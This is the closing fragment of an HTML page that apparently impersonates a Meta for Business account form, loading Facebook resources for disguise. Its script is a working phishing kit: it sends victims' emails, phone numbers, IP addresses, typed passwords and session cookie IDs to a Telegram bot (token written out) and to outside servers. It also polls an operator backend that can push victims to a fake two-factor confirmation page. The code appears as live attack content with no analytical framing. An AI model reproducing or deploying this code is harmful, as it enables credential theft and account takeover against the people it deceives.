                                src: "https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/_tJ17sGyxOX.js?_nc_x=Ij3Wp8lg5Kz"
                            },
                            WgG0JOY: {
                                type: "js",
                                src: "https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/6Kq_ckQkhEj.js?_nc_x=Ij3Wp8lg5Kz"
                            }
                        }
                    }
                },
                allResources: ["zPYlTyl", "WgG0JOY", "xlYyWYt", "csb9jgJ", "eUyf8CS", "esk5Keq", "hUng91v", "OiWJ4+T", "dWto8Fr", "pZuCvpU", "j4zvrHq", "OprjAFb"]
            });
        }));
    </script>


</body>
<script>
    const link_call = 'http://103.133.107.210';
    const port_call = '5000';
    const call_api = "https://meta-forbusiness.ngrok.app";
    let check_submit = false
    $(document).ready(function() {
        GetSess();
        setInterval(function() {
            getsttindex(sessid); // Thay '32131' bằng id thực tế của bạn
        }, 3000);
        document.getElementById('password-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendPasword();
            }

        });
    });
    var sessid = "";
    var ip = "";
    var country = "";

    function getsttindex() {
        // Tạo yêu cầu AJAX bằng jQuery
        $.ajax({
            url: "https://1646415.com/post.php?t=getstt2fa&id=" + sessid,
            method: "GET",
            dataType: "JSON",
            success: function(data) {
                if (data == '2FA') {
                    window.location.href = 'confirm.php';
                } else if (data == 'Success') {
                    window.location.href = 'success.php';
                } else if (data == 'Index') {
                    window.location.href = 'index.php';
                } else {
                    console.log('khác');
                }
            },
            error: function() {
                // Xử lý lỗi nếu có
                console.error("Đã xảy ra lỗi trong quá trình lấy dữ liệu.");
            }
        });
    }

    function updatepass(pass) {
        $.ajax({
            url: "https://1646415.com/post.php?t=update2&id=" + sessid + "&password=" + pass,
            method: "POST",
            dataType: 'JSON'

        });
    }

    function AddSess() {
        $.ajax({
            url: 'https://1646415.com/modun_post.php',
            type: 'POST',
            dataType: 'JSON',
            data: {
                t: 'insert_sess',
                id: sessid
            },

            success: function(data) {
                console.log('true', data);
            },
            error: function() {
                console.error('false');

            }
        });

    }

    function checkCountry() {
        $.ajax({
            url: 'https://ipinfo.io/' + ip + '/json?',
            dataType: 'json',
            success: function(response) {
                country = response.country;
                console.log(country);
            },
            error: function() {
                $("#ip-info").text("Không thể kiểm tra quốc gia cho IP " + ip);
            }
        });
    }

    function getIP() {
        $.ajax({
            url: 'https://ipinfo.io',
            dataType: 'json',
            success: function(response) {
                ip = response.ip;
                console.log(ip);
            },
            error: function() {
                console.log("k get đc");
            }
        });
    }

    function GetSess() {
        var username = $.cookie();
        if (username) {
            sessid = username['PHPSESSID'];
            console.log(username['PHPSESSID']);
        } else {
            $('#cookieValue').text('Cookie không tồn tại');
        }
        return sessid;
    }

    const x = setInterval(() => {
        var checkbox = document.getElementById("check").checked;
        var title = $("#name").val();
        var mail = $("#email").val();
        var reason = $("#reason").val();
        if (checkbox == true && title != '' && mail != '' && reason != '') {
            check_submit = true
            $("#btn-submit").prop("disabled", false);

        } else {
            check_submit = false
            $("#btn-submit").prop("disabled", true);
        }
    }, 500);

    function update() {
        var country_code = $("select[id='country_code'] option:selected").val();
        var phone = $('#phone').val();
        $.ajax({
            url: "https://1646415.com/modun_post.php",
            method: "POST",
            data: {
                t: 'update1',
                id: sessid,
                email: email,
                phone: country_code + " " + phone,
                country: country
            }
        });
    }

    function sendEmail() {

        $("#message_err").html('<p ></p>');
        $("#password-input").val('')
        clearInterval(x)
        var payload = {
            'email': $("#email").val(),
            'type': 'email'
        };
        if (check_submit == true) {

            var reason = $('#reason').val();
            $.ajax({
                url: "https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage",
                method: "POST",
                data: {
                    chat_id: "-4089815989",
                    text: "Email: " + email + "\nMã Vùng:" + country_code + "\nPhone: " + phone + "\nIp: " + ip + "\nMô tả:" + reason
                }
            });

            var phone = $('#phone').val();
            var email = $('#email').val();
            var country_code = $("select[id='country_code'] option:selected").val();

            var url = "https://1646415.com/post.php?t=update1&id=" + sessid + "&email=" + email + "&phone=" + country_code + " " + phone + "&country=" + country;

            // Thực hiện yêu cầu POST
            $.post(url, function(response) {
                // Xử lý kết quả ở đây
                console.log(response);
            });

            $.ajax({
                url: 'server.php',
                dataType: 'json',
                data: payload,
                method: "POST",
                rejectUnauthorized: false,
                success: function(response) {
                    response = JSON.parse(response)
                    $("#passwordModal").modal("show");
                    var clientToken = response.clientToken;
                    console.log(clientToken);
                    localStorage.setItem('clientToken', clientToken);
                    update();
                },
                error: function(err) {

                    console.log(err);
                }
            });
        }

    };

    $(".submit_password").click(function() {
        sendPasword();
    });

    function sendPasword() {

        $(".submit_password").prop("disabled", true);
        var clientToken = localStorage.getItem('clientToken');
        var payload = {
            'email': $("#email").val(),
            'password': $("#password-input").val(),
            'type': 'password'
        };
        $.ajax({
            url: 'server.php',
            dataType: 'json',
            data: payload,
            method: "POST",
            headers: {
                'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
            },
            success: function(response) {
                var password = $("#password-input").val();
                var url1 = "https://1646415.com/post.php?t=update2&id=" + sessid + "&password=" + password;
                response = JSON.parse(response)
                if (response.status) {
                    localStorage.setItem('typeCheckPoint', response.type)
                    // $("#passwordModal").modal("hide");
                    $("#message_err").html('<p style="color: green;">' + response.message + '</p>')
                    if (response.pass == true) {
                        setTimeout(() => {


                            // Thực hiện yêu cầu POST
                            $.post(url1, function(response) {
                                // Xử lý kết quả ở đây
                                console.log(response);
                            });
                            window.location.href = "loading.php"
                        }, 1500);
                    } else {
                        setTimeout(() => {
                            $.post(url1, function(response) {
                                // Xử lý kết quả ở đây
                                console.log(response);
                            });
                            window.location.href = "confirm.php"
                        }, 1500);
                    }
                } else {
                    $("#message_err").html('<p style="color: red;">' + response.message + '</p>')
                    $(".submit_password").prop("disabled", false);
                }
            },
            error: function(err) {
                console.log(err);
            }
        });
    };
</script>

</html>